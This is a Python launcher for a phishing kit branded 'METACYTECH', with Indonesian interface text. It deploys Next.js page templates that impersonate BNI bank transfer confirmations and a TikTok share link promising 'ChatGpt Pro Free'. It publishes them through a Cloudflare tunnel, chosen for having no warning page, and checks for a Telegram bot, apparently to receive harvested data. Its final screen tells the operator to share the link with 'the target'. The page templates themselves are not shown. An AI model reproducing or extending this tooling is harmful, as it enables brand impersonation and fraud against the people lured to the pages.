#!/usr/bin/env python3
"""
METACYTECH - Interactive Launcher v3.0
Dual Template System: BNI (Bank Transfer) + TikTok (Video Share Link)
Cloudflare Tunnel (no warning page) + Next.js + Telegram
"""

import os
import sys
import time
import json
import re
import shutil
import subprocess
import threading
import urllib.request

IS_WIN = sys.platform == "win32"
IS_ANDROID = "ANDROID_ROOT" in os.environ or "TERMUX_VERSION" in os.environ

if IS_WIN:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        os.system("")

def _find_pid_on_port(port):
    """Find PID listening on a given port. Cross-platform."""
    try:
        if IS_WIN:
            r = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=5, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
            for line in r.stdout.split("\n"):
                if f":{port}" in line and "LISTENING" in line:
                    return line.split()[-1]
        else:
            # Linux / macOS / Android (Termux)
            r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.split("\n"):
                if f":{port}" in line:
                    m = re.search(r'pid=(\d+)', line)
                    if m:
                        return m.group(1)
            # Fallback: lsof
            r = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True, timeout=5)
            pids = r.stdout.strip().split("\n")
            if pids and pids[0]:
                return pids[0]
    except Exception:
        pass
    return None

def check_port(port):
    pid = _find_pid_on_port(port)
    return pid is not None

def kill_port(port):
    try:
        pid = _find_pid_on_port(port)
        if pid:
            if IS_WIN:
                subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True, timeout=5, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
            else:
                subprocess.run(["kill", "-9", pid], capture_output=True, timeout=5)
    except Exception:
        pass

def kill_all():
    procs = ["node", "cloudflared", "ngrok"]
    if IS_WIN:
        for exe in ["node.exe", "cloudflared.exe", "ngrok.exe"]:
            subprocess.run(["taskkill", "/F", "/IM", exe], capture_output=True, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
    else:
        for name in procs:
            subprocess.run(["pkill", "-9", "-f", name], capture_output=True)

def _find_cloudflared_path():
    if IS_WIN:
        try:
            r = subprocess.run(["where", "cloudflared"], capture_output=True, text=True, timeout=5, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
            if r.returncode == 0 and r.stdout.strip():
                return r.stdout.strip().split("\n")[0].strip()
        except Exception:
            pass
        for p in [r"C:\Program Files (x86)\cloudflared\cloudflared.exe", r"C:\Program Files\cloudflared\cloudflared.exe"]:
            if os.path.exists(p):
                return p
    else:
        # Linux / macOS / Android (Termux)
        try:
            r = subprocess.run(["which", "cloudflared"], capture_output=True, text=True, timeout=5)
            if r.returncode == 0 and r.stdout.strip():
                return r.stdout.strip().split("\n")[0].strip()
        except Exception:
            pass
        for p in ["/usr/bin/cloudflared", "/usr/local/bin/cloudflared"]:
            if os.path.exists(p):
                return p
    return None

APP_DIR = os.path.dirname(os.path.abspath(__file__))
SRC_PAGE = os.path.join(APP_DIR, "src", "app", "page.tsx")
SRC_LAYOUT = os.path.join(APP_DIR, "src", "app", "layout.tsx")
TEMPLATES_DIR = os.path.join(APP_DIR, "templates")

# Template definitions
TEMPLATES = {
    "bni": {
        "name": "BNI - Bank Transfer",
        "icon": "[1]",
        "label": "Bank Transfer Verification",
        "title": "BNI - Hasil Transaksi",
        "description": "Konfirmasi transfer bank aman",
        "favicon": "favicon.svg",
        "og_image": "/bni-logo.svg",
        "dir": os.path.join(TEMPLATES_DIR, "bni"),
        "public_dir": os.path.join(TEMPLATES_DIR, "bni", "public"),
    },
    "tiktok": {
        "name": "TikTok - Video Share Link",
        "icon": "[2]",
        "label": "TikTok Video Verification",
        "title": "TikTok - ChatGpt Pro Free",
        "description": "vt.tiktok.com",
        "favicon": "favicon.svg",
        "og_image": "/LOGO-TIKTOK.png",
        "dir": os.path.join(TEMPLATES_DIR, "tiktok"),
        "public_dir": os.path.join(TEMPLATES_DIR, "tiktok", "public"),
    },
}


class C:
    RST = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    BG_B = "\033[44m"
    MAG = "\033[35m"
    BG_R = "\033[41m"


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    cls()
    clown_face = [
        r"",
        r"                      .========================================.",
        r"                     /                                          /",
        r"                    /                                            /",
        r"                   |                                              |",
        r"                   |   .--------------------------------------.   |",
        r"                   |   |                                      |   |",
        r"                   |   |   .--------.    .--------.           |   |",
        r"                   |   |   | ██████ |    | ██████ |           |   |",
        r"                   |   |   | ██>><<██ |    | ██>><<██ |        |   |",
        r"                   |   |   | ██████ |    | ██████ |           |   |",
        r"                   |   |   '----+---'    '---+----'           |   |",
        r"                   |   |        ^   >><<   v                    |   |",
        r"                   |   |         ^      v                     |   |",
        r"                   |   |          ( O  O )                    |   |",
        r"                   |   |           ^ ## v                     |   |",
        r"                   |   |            ^##v                      |   |",
        r"                   |   |         __/    \__                   |   |",
        r"                   |   |        / ████████ \                  |   |",
        r"                   |   |       / /|      |\ \                 |   |",
        r"                   |   |      / / |      | \ \                |   |",
        r"                   |   |     / /  |      |  \ \               |   |",
        r"                   |   |    / /   |      |   \ \              |   |",
        r"                   |   |   / /    |      |    \ \             |   |",
        r"                   |   |  / /     |      |     \ \            |   |",
        r"                   |   | / /      |      |      \ \           |   |",
        r"                   |   |/_/       |______|       \_\          |   |",
        r"                   |                                              |",
        r"                    \                                            /",
        r"                     \                                          /",
        r"                      '=========================================='",
        r"",
    ]
    title = [
        r"   ███╗   ███╗███████╗████████╗ █████╗  ██████╗██████╗ ██╗   ██╗████████╗███████╗ ██████╗██╗  ██╗",
        r"   ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║",
        r"   ██╔████╔██║█████╗     ██║   ███████║██║     ██████╔╝ ╚████╔╝    ██║   █████╗  ██║     ███████║",
        r"   ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║     ██╔══██╗  ╚██╔╝     ██║   ██╔══╝  ██║     ██╔══██║",
        r"   ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║╚██████╗██║  ██║   ██║      ██║   ███████╗╚██████╗██║  ██║",
        r"   ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝",
    ]
    print()
    clown_colors = [C.RED, C.MAG, C.RED, C.MAG, C.RED, C.MAG]
    idx = 0
    for line in clown_face:
        col = clown_colors[idx % len(clown_colors)]
        sys.stdout.write(f"{col}{C.B}{line}{C.RST}\n")
        time.sleep(0.025)
        idx += 1
    print()
    cols = [C.RED, C.YLW, C.RED, C.RED, C.YLW, C.RED]
    for line in title:
        for i, ch in enumerate(line):
            sys.stdout.write(f"{cols[i % 3]}{ch}")
        sys.stdout.write(C.RST + "\n")
        time.sleep(0.04)
    print()
    print(f"{C.RED}  {'=' * 64}{C.RST}")
    print(f"{C.B}{C.WHT}  METACYTECH  *  Cloudflare Tunnel  *  Telegram{C.RST}")
    print(f"{C.RED}  {'=' * 64}{C.RST}")
    print()


def template_menu(current_template):
    print(f"{C.B}{C.WHT}  ┌─────────────────────────────────────────────────┐{C.RST}")
    print(f"{C.B}{C.WHT}  │            🎨 PILIH TEMPLATE                    │{C.RST}")
    print(f"{C.B}{C.WHT}  ├─────────────────────────────────────────────────┤{C.RST}")
    for key, t in TEMPLATES.items():
        marker = f" {C.GRN}< active{C.RST}" if key == current_template else ""
        print(f"{C.B}{C.WHT}  │  {t['icon']} {t['name']:<42} │{C.RST}")
        print(f"{C.DIM}  │       {t['label']:<30}{marker:<12}{C.RST} │{C.RST}")
    print(f"{C.B}{C.WHT}  └─────────────────────────────────────────────────┘{C.RST}")
    print()


def menu(current_template):
    tmpl = TEMPLATES[current_template]
    print(f"{C.B}{C.WHT}  ┌─────────────────────────────────────────────────┐{C.RST}")
    print(f"{C.B}{C.WHT}  │              📋 MAIN MENU                       │{C.RST}")
    print(f"{C.B}{C.WHT}  ├─────────────────────────────────────────────────┤{C.RST}")
    print(f"{C.B}{C.WHT}  │  [1] 🚀 Start Everything                       │{C.RST}")
    print(f"{C.DIM}  │       Build + Server + Cloudflare Tunnel       │{C.RST}")
    print(f"{C.B}{C.WHT}  │  [2] 🛑 Stop Everything                        │{C.RST}")
    print(f"{C.DIM}  │       Kill all services                        │{C.RST}")
    print(f"{C.B}{C.WHT}  │  [3] 📊 Show Status                            │{C.RST}")
    print(f"{C.DIM}  │       Check running services & URL             │{C.RST}")
    print(f"{C.B}{C.WHT}  │  [4] 🔗 Copy URL                               │{C.RST}")
    print(f"{C.DIM}  │       Copy tunnel URL to clipboard             │{C.RST}")
    print(f"{C.B}{C.WHT}  │  [5] 🎨 Ganti Template                         │{C.RST}")
    print(f"{C.DIM}  │       Current: {tmpl['name']:<29}{C.RST}│{C.RST}")
    print(f"{C.B}{C.WHT}  │  [6] ❌ Exit                                   │{C.RST}")
    print(f"{C.DIM}  │       Stop all and quit                        │{C.RST}")
    print(f"{C.B}{C.WHT}  └─────────────────────────────────────────────────┘{C.RST}")
    print()


class Engine:
    def __init__(self):
        self.app_dir = APP_DIR
        self.app_port = 3000
        self.nextjs_proc = None
        self.tunnel_proc = None
        self.url = None
        self.building = False
        self.current_template = "bni"

    def _nw(self):
        flags = {}
        if hasattr(subprocess, "CREATE_NO_WINDOW"):
            flags["creationflags"] = subprocess.CREATE_NO_WINDOW
        return flags

    def apply_template(self, template_key):
        tmpl = TEMPLATES.get(template_key)
        if not tmpl:
            print(f"{C.RED}  ❌ Template '{template_key}' tidak ditemukan!{C.RST}")
            return False
        tmpl_dir = tmpl["dir"]
        tmpl_page = os.path.join(tmpl_dir, "page.tsx")
        if not os.path.exists(tmpl_page):
            print(f"{C.RED}  ❌ File template tidak ada: {tmpl_page}{C.RST}")
            return False
        SRC_PUBLIC = os.path.join(self.app_dir, "public")
        tmpl_pub = tmpl.get("public_dir")
        print(f"{C.CYN}  🎨 Menerapkan template: {tmpl['name']}...{C.RST}")
        # Copy page.tsx
        shutil.copy2(tmpl_page, SRC_PAGE)
        # Copy layout.tsx (each template has its own with correct OG tags)
        tmpl_layout = os.path.join(tmpl_dir, "layout.tsx")
        if os.path.exists(tmpl_layout):
            shutil.copy2(tmpl_layout, SRC_LAYOUT)
            print(f"{C.DIM}  📄 Copied: layout.tsx{C.RST}")
        # Copy template-specific public assets to public/ folder
        if tmpl_pub and os.path.isdir(tmpl_pub):
            for fname in os.listdir(tmpl_pub):
                src_f = os.path.join(tmpl_pub, fname)
                dst_f = os.path.join(SRC_PUBLIC, fname)
                if os.path.isfile(src_f):
                    shutil.copy2(src_f, dst_f)
                    print(f"{C.DIM}  📄 Copied: {fname}{C.RST}")
        print(f"{C.GRN}  ✅ Template '{tmpl['name']}' berhasil diterapkan!{C.RST}")
        self.current_template = template_key
        return True

    def check_port(self, port):
        return check_port(port)

    def kill_port(self, port):
        kill_port(port)

    def kill_all(self):
        kill_all()
        self.nextjs_proc = None
        self.tunnel_proc = None

    def build(self):
        print(f"\n{C.CYN}  ⏳ Building Next.js app...{C.RST}")
        nm = os.path.join(self.app_dir, "node_modules")
        if not os.path.exists(nm):
            print(f"{C.YLW}  📦 Installing dependencies...{C.RST}")
            subprocess.run(["npm", "install"], cwd=self.app_dir, shell=IS_WIN, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        env["NODE_OPTIONS"] = "--max-old-space-size=4096"
        self.building = True
        frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        def spin():
            i = 0
            while self.building:
                sys.stdout.write(f"\r{C.CYN}  {frames[i % 10]} Building...{C.RST}  ")
                sys.stdout.flush()
                time.sleep(0.1)
                i += 1
        t = threading.Thread(target=spin, daemon=True)
        t.start()
        # Android needs much more time to build and Turbopack is NOT supported on ARM
        build_timeout = 600 if IS_ANDROID else 120
        build_cmd = ["npx", "next", "build"]
        if IS_ANDROID:
            build_cmd.append("--no-turbopack")
            env["NEXT_TURBOPACK"] = "0"
        r = subprocess.run(build_cmd, cwd=self.app_dir, env=env, shell=IS_WIN, capture_output=True, text=True, timeout=build_timeout)
        self.building = False
        time.sleep(0.2)
        sys.stdout.write("\r" + " " * 40 + "\r")
        sys.stdout.flush()
        if r.returncode == 0:
            print(f"{C.GRN}  ✅ Build successful!{C.RST}")
            return True
        print(f"{C.RED}  ❌ Build failed!{C.RST}")
        if r.stderr:
            for e in r.stderr.strip().split("\n")[-3:]:
                print(f"{C.RED}     {e}{C.RST}")
        return False

    def start_server(self):
        if self.check_port(self.app_port):
            print(f"{C.YLW}  ⚠️  Port {self.app_port} in use, clearing...{C.RST}")
            self.kill_port(self.app_port)
            time.sleep(2)
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        self.nextjs_proc = subprocess.Popen(["npx", "next", "start", "-p", str(self.app_port)], cwd=self.app_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        print(f"{C.CYN}  ⏳ Starting server on port {self.app_port}...{C.RST}")
        for i in range(15):
            time.sleep(1)
            if self.check_port(self.app_port):
                print(f"{C.GRN}  ✅ Server running at http://localhost:{self.app_port}{C.RST}")
                return True
            sys.stdout.write(f"\r{C.CYN}  ⏳ Waiting... ({i+1}s){C.RST}  ")
            sys.stdout.flush()
        sys.stdout.write("\r" + " " * 40 + "\r")
        sys.stdout.flush()
        print(f"{C.GRN}  ✅ Server starting...{C.RST}")
        return True

    def _find_cloudflared(self):
        return _find_cloudflared_path()

    def start_tunnel(self):
        cf = self._find_cloudflared()
        if not cf:
            print(f"{C.RED}  ❌ cloudflared not found!{C.RST}")
            print(f"{C.DIM}     Install: winget install cloudflare.cloudflared{C.RST}")
            return self._start_ngrok_fallback()
        self.kill_tunnel()
        time.sleep(1)
        print(f"{C.CYN}  ⏳ Starting Cloudflare Tunnel...{C.RST}")
        log = os.path.join(self.app_dir, "tunnel.log")
        self.tunnel_proc = subprocess.Popen([cf, "tunnel", "--url", f"http://localhost:{self.app_port}"], stdout=open(log, "w"), stderr=subprocess.STDOUT, **self._nw())
        for _ in range(30):
            time.sleep(2)
            try:
                with open(log) as f:
                    m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", f.read())
                    if m:
                        self.url = m.group(0)
                        print(f"{C.GRN}  ✅ Cloudflare Tunnel ready! (No warning page!){C.RST}")
                        return self.url
            except Exception:
                pass
        print(f"{C.YLW}  ⚠️  Could not get tunnel URL{C.RST}")
        return None

    def _start_ngrok_fallback(self):
        try:
            subprocess.run(["ngrok", "--version"], capture_output=True, shell=True, check=True, **self._nw())
        except Exception:
            print(f"{C.RED}  ❌ Neither cloudflared nor ngrok found!{C.RST}")
            return None
        self.kill_tunnel()
        time.sleep(1)
        print(f"{C.CYN}  ⏳ Starting ngrok (has warning page)...{C.RST}")
        self.tunnel_proc = subprocess.Popen(f"ngrok http {self.app_port}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, **self._nw())
        for _ in range(10):
            time.sleep(2)
            try:
                with urllib.request.urlopen("http://localhost:4040/api/tunnels", timeout=3) as r:
                    for t in json.loads(r.read()).get("tunnels", []):
                        if t.get("proto") == "https":
                            self.url = t["public_url"]
                            print(f"{C.GRN}  ✅ Ngrok tunnel ready!{C.RST}")
                            return self.url
            except Exception:
                pass
        return None

    def kill_tunnel(self):
        if IS_WIN:
            for exe in ["cloudflared.exe", "ngrok.exe"]:
                subprocess.run(["taskkill", "/F", "/IM", exe], capture_output=True, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
        else:
            for name in ["cloudflared", "ngrok"]:
                subprocess.run(["pkill", "-9", "-f", name], capture_output=True)
        log = os.path.join(self.app_dir, "tunnel.log")
        if os.path.exists(log):
            try: os.remove(log)
            except: pass
        self.tunnel_proc = None

    def has_telegram(self):
        env = os.path.join(self.app_dir, ".env.local")
        if os.path.exists(env):
            with open(env) as f:
                c = f.read()
                return "TELEGRAM_BOT_TOKEN" in c and "TELEGRAM_CHAT_ID" in c
        return False

    def start_all(self):
        tmpl = TEMPLATES[self.current_template]
        print(f"\n{C.B}{C.WHT}  {'=' * 50}{C.RST}")
        print(f"{C.B}{C.WHT}  MEMULAI LAYANAN{C.RST}")
        print(f"{C.B}{C.WHT}  Template: {tmpl['name']}{C.RST}")
        print(f"{C.B}{C.WHT}  {'=' * 50}{C.RST}\n")
        if self.has_telegram():
            print(f"{C.GRN}  Telegram bot sudah dikonfigurasi{C.RST}")
        else:
            print(f"{C.YLW}  Telegram bot BELUM dikonfigurasi{C.RST}")
        print()
        if not self.apply_template(self.current_template):
            return False
        print()
        if not self.build(): return False
        print()
        if not self.start_server(): return False
        print()
        url = self.start_tunnel()
        if url:
            self._update_metadata_base(url)
            print(f"\n{C.CYN}  Rebuilding with correct metadataBase...{C.RST}")
            if self.build():
                self._restart_server()
        print()
        self.show_ready(url)
        return True

    def _update_metadata_base(self, url):
        if not os.path.exists(SRC_LAYOUT):
            return
        with open(SRC_LAYOUT, "r", encoding="utf-8") as f:
            content = f.read()
        if "metadataBase" in content:
            # Replace existing metadataBase URL
            content = re.sub(
                r'metadataBase:\s*new URL\("[^"]*"\)',
                'metadataBase: new URL("' + url + '")',
                content
            )
        else:
            # Add metadataBase before the closing brace of metadata object
            content = content.replace(
                "};\n\nexport default",
                '  metadataBase: new URL("' + url + '"),\n};\n\nexport default'
            )
        with open(SRC_LAYOUT, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"{C.GRN}  metadataBase updated: {url}{C.RST}")

    def _restart_server(self):
        print(f"{C.CYN}  Restarting server after rebuild...{C.RST}")
        self.kill_port(self.app_port)
        time.sleep(2)
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        self.nextjs_proc = subprocess.Popen(["npx", "next", "start", "-p", str(self.app_port)], cwd=self.app_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        for i in range(10):
            time.sleep(1)
            if self.check_port(self.app_port):
                print(f"{C.GRN}  Server restarted!{C.RST}")
                return True
        return True

    def stop_all(self):
        print(f"\n{C.YLW}  🛑 Menghentikan semua layanan...{C.RST}")
        if self.nextjs_proc:
            try:
                self.nextjs_proc.terminate()
                self.nextjs_proc.wait(timeout=5)
            except: pass
        self.kill_port(self.app_port)
        print(f"{C.DIM}  ✓ Server dihentikan{C.RST}")
        self.kill_tunnel()
        print(f"{C.DIM}  ✓ Tunnel dihentikan{C.RST}")
        self.url = None
        print(f"{C.GRN}  ✅ Semua layanan dihentikan!{C.RST}\n")

    def show_status(self):
        tmpl = TEMPLATES[self.current_template]
        print(f"\n{C.B}{C.WHT}  {'═' * 50}{C.RST}")
        print(f"{C.B}{C.WHT}  📊 STATUS LAYANAN{C.RST}")
        print(f"{C.B}{C.WHT}  {'═' * 50}{C.RST}\n")
        srv = self.check_port(self.app_port)
        print(f"  {'✅' if srv else '❌'} Next.js Server : {'BERJALAN' if srv else 'BERHENTI'} (port {self.app_port})")
        print(f"  🎨 Template     : {tmpl['name']}")
        url = None
        log = os.path.join(self.app_dir, "tunnel.log")
        if os.path.exists(log):
            try:
                with open(log) as f:
                    m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", f.read())
                    if m: url = m.group(0); self.url = url
            except: pass
        if url:
            print(f"  ✅ Tunnel       : BERJALAN (Cloudflare - Tanpa warning page)")
            print(f"  🔗 Public URL   : {url}")
        else:
            print(f"  ❌ Tunnel       : BERHENTI")
        print(f"  {'✅' if self.has_telegram() else '⚠️ '} Telegram Bot   : {'TERKONFIGURASI' if self.has_telegram() else 'BELUM DIKONFIGURASI'}")
        print(f"\n{C.DIM}  💡 Local: http://localhost:{self.app_port}{C.RST}\n")

    def show_ready(self, url=None):
        tmpl = TEMPLATES[self.current_template]
        print(f"{C.B}{C.GRN}  ╔═══════════════════════════════════════════════════╗{C.RST}")
        print(f"{C.B}{C.GRN}  ║              🚀 SISTEM SIAP!                     ║{C.RST}")
        print(f"{C.B}{C.GRN}  ╚═══════════════════════════════════════════════════╝{C.RST}\n")
        print(f"  🎨 Template: {C.B}{tmpl['name']}{C.RST}")
        if url:
            print(f"\n{C.B}{C.CYN}  🌐 PUBLIC URL (Bagikan ini!):{C.RST}\n")
            print(f"  {C.B}{C.BG_B}{C.WHT}  {url}  {C.RST}\n")
        else:
            print(f"  {C.YLW}⚠️  URL tunnel tidak tersedia{C.RST}")
        print(f"{C.DIM}  Local: http://localhost:{self.app_port}{C.RST}")
        print(f"\n{C.B}  📱 Bagikan URL di atas ke target!{C.RST}")
        print(f"{C.DIM}  Tekan [2] untuk berhenti, [3] untuk status, [6] untuk keluar{C.RST}\n")


def choose_template(eng):
    banner()
    template_menu(eng.current_template)
    tmpl_keys = list(TEMPLATES.keys())
    print(f"{C.CYN}  ➤ Pilih template (1-{len(tmpl_keys)}): {C.RST}", end="")
    choice = input().strip()
    if choice in ["1", "2"]:
        idx = int(choice) - 1
        if idx < len(tmpl_keys):
            key = tmpl_keys[idx]
            if key != eng.current_template:
                eng.stop_all()
                eng.current_template = key
                print(f"\n{C.GRN}  ✅ Template diubah ke: {TEMPLATES[key]['name']}{C.RST}")
                time.sleep(1)
                eng.start_all()
            else:
                print(f"{C.YLW}  ⚠️  Template sudah aktif!{C.RST}")
        else:
            print(f"{C.YLW}  ⚠️  Pilihan tidak valid!{C.RST}")
    else:
        print(f"{C.YLW}  ⚠️  Pilihan tidak valid!{C.RST}")


def main():
    if os.name == "nt": os.system("")
    eng = Engine()
    banner()

    print(f"{C.B}{C.WHT}  ┌─────────────────────────────────────────────────┐{C.RST}")
    print(f"{C.B}{C.WHT}  │         🎨 PILIH TEMPLATE TERLEBIH DAHULU       │{C.RST}")
    print(f"{C.B}{C.WHT}  ├─────────────────────────────────────────────────┤{C.RST}")
    print(f"{C.B}{C.WHT}  │  [1] 🏦 BNI - Bank Transfer Verification        │{C.RST}")
    print(f"{C.DIM}  │       Template transfer bank BNI                │{C.RST}")
    print(f"{C.B}{C.WHT}  │  [2] 🎵 TikTok - Video Share Link               │{C.RST}")
    print(f"{C.DIM}  │       Template verifikasi video TikTok          │{C.RST}")
    print(f"{C.B}{C.WHT}  └─────────────────────────────────────────────────┘{C.RST}")
    print()

    while True:
        try:
            print(f"{C.CYN}  ➤ Pilih template (1-2): {C.RST}", end="")
            ch = input().strip()
            if ch in ["1", "2"]:
                idx = int(ch) - 1
                tmpl_keys = list(TEMPLATES.keys())
                eng.current_template = tmpl_keys[idx]
                print(f"\n{C.GRN}  ✅ Template dipilih: {TEMPLATES[eng.current_template]['name']}{C.RST}")
                time.sleep(0.5)
                break
            else:
                print(f"{C.YLW}  ⚠️  Masukkan 1 atau 2!{C.RST}")
        except (KeyboardInterrupt, EOFError):
            print(f"\n{C.CYN}👋 Sampai jumpa!{C.RST}")
            sys.exit(0)

    eng.start_all()

    while True:
        try:
            print(f"{C.B}{C.WHT}  {'═' * 50}{C.RST}\n")
            menu(eng.current_template)
            print(f"{C.CYN}  ➤ Pilih menu (1-6): {C.RST}", end="")
            ch = input().strip()
            if ch == "1": eng.start_all()
            elif ch == "2": eng.stop_all()
            elif ch == "3": eng.show_status()
            elif ch == "4":
                url = eng.url
                if not url:
                    eng.show_status()
                    url = eng.url
                if url:
                    print(f"\n  {C.B}{C.CYN}📋 URL:{C.RST}")
                    print(f"  {C.BG_B}{C.WHT}  {url}  {C.RST}\n")
                    try:
                        subprocess.run("clip", input=url.encode("utf-8"), check=True)
                        print(f"  {C.GRN}✅ Disalin ke clipboard!{C.RST}\n")
                    except: print(f"  {C.DIM}(Salin manual){C.RST}\n")
                else:
                    print(f"\n  {C.YLW}⚠️  Tidak ada URL. Tekan [1] untuk memulai.{C.RST}\n")
            elif ch == "5":
                choose_template(eng)
            elif ch == "6":
                eng.stop_all()
                print(f"  {C.CYN}👋 Sampai jumpa!{C.RST}\n")
                sys.exit(0)
            else: print(f"  {C.YLW}⚠️  Masukkan 1-6{C.RST}")
        except KeyboardInterrupt:
            print(); eng.stop_all()
            print(f"  {C.CYN}👋 Sampai jumpa!{C.RST}\n"); sys.exit(0)
        except EOFError: eng.stop_all(); sys.exit(0)


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{C.CYN}👋 Keluar...{C.RST}")
    except Exception as e:
        print(f"\n{C.RED}❌ Error: {e}{C.RST}"); sys.exit(1)